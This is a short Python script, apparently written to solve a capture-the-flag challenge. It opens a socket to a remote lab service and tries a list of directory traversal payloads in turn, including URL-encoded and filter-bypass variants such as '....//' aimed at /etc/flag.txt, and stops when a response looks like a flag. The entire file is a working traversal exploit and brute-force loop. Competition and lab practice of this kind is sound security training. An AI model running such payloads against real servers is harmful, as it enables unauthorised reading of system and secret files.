import socket, time

def talk(payload):
    s = socket.socket()
    s.connect(('lab.hexnova.space', 30357))
    s.settimeout(5)
    buf = b''
    while b'> ' not in buf:
        try: buf += s.recv(4096)
        except: break
    s.sendall((payload + '\n').encode())
    time.sleep(0.8)
    resp = b''
    for _ in range(5):
        try: resp += s.recv(4096)
        except: break
    s.close()
    return resp.decode(errors='replace')

payloads = [
    '../../../etc/flag.txt',
    '../../../../etc/flag.txt',
    '../flag.txt',
    '../../flag.txt',
    '../../../flag.txt',
    '/etc/flag.txt',
    '../../../tmp/flag.txt',
    '....//....//....//etc/flag.txt',
    '%2e%2e/%2e%2e/%2e%2e/etc/flag.txt',
    '..%2f..%2f..%2fetc%2fflag.txt',
    '../../../etc/flag',
    '../../flag',
    '../flag',
]

for p in payloads:
    r = talk(p)
    if 'CHAKRA' in r or ('content' in r.lower() and 'wrong' not in r.lower() and 'nothing' not in r.lower()):
        print(f'HIT [{p}]: {r[:300]}')
        break
    else:
        print(f'[{p}]: {r[:80].strip()}')
